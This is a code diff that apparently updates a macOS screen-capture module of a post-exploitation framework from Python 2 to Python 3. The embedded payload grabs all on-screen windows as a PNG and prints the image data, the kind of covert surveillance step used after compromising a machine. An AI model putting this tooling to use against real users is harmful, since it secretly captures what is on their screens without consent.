@@ -36,7 +36,7 @@ class Module(object):
             'Language' : 'python',
 
             # the minimum language version needed
-            'MinLanguageVersion' : '2.6',
+            'MinLanguageVersion' : '3.6',
 
             # list of any references/other comments
             'Comments': []
@@ -77,7 +77,7 @@ try:
     from AppKit import *
     import binascii
 except ImportError:
-    print "Missing required module..."
+    print("Missing required module...")
 
 onScreenWindows = CG.CGWindowListCreate(CG.kCGWindowListOptionOnScreenOnly, CG.kCGNullWindowID)
 desktopElements = Foundation.CFArrayCreateMutableCopy(None, 0, onScreenWindows)
@@ -85,9 +85,13 @@ imageRef = CG.CGWindowListCreateImageFromArray(CG.CGRectInfinite, desktopElement
 rep = NSBitmapImageRep.alloc().initWithCGImage_(imageRef)
 props = NSDictionary()
 imageData = rep.representationUsingType_properties_(NSPNGFileType,props)
-imageString = str(imageData).strip('<').strip('>>').strip('native-selector bytes of')
-hexstring = binascii.hexlify(imageString)
-hex_data = hexstring.decode('hex')
-print hex_data
+time.sleep(.1)
+imageData = bytes(imageData)
+#Don't ask why but you need the sleep statements
+time.sleep(.1)
+imageData = imageData.decode('latin-1')
+time.sleep(.1)
+print(imageData)
+time.sleep(.1)
 """
         return script
